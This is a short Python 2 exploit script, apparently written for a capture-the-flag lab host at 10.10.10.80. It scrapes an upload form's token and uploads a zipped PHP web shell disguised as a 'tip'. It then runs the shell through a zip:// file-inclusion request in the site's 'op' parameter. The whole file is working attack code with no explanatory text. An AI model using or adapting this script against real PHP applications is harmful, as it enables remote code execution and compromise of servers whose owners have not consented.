import requests
import socket
import fcntl
import struct
import os
from BeautifulSoup import BeautifulSoup
import zipfile

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])

ip = get_ip_address('tun0')
print ip

session = requests.session()
#Get the token we'll be uploading with
form_text = session.get('http://10.10.10.80?op=upload').text
soup = BeautifulSoup(form_text)
token = soup.find(id='token')['value']

zf = zipfile.ZipFile('shell.zip', mode='w')
zf.write('shell.php')
zf.close()

data = None
with open('shell.zip', 'rb') as payloadfile:
    data = payloadfile.read()

payload = {'tip': data,
            'name': 'Booj',
            'token': token,
            'submit': 'Send Tip!'}

x = session.post('http://10.10.10.80?op=upload', data=payload)
payload_name = x.url.split('=')[-1]

url = 'http://10.10.10.80?op=zip:///var/www/html/uploads/%s/%s%%23shell'%(ip, payload_name)
print url
session.get(url)
